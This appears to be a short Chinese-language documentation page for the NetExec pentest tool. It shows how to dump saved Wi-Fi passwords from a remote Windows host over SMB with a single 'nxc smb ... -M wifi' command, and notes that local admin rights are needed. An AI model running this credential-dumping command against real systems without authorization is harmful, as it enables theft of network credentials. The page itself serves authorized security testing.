# 导出 WIFI 密码

获取在 Windows 中注册的 WIFI 密码

{% hint style="warning" %}
你需要在远程目标上至少具有本地管理员权限，如果你的用户是本地账户，请使用 **--local-auth** 选项
{% endhint %}

```
nxc smb <ip> -u user -p pass -M wifi
```
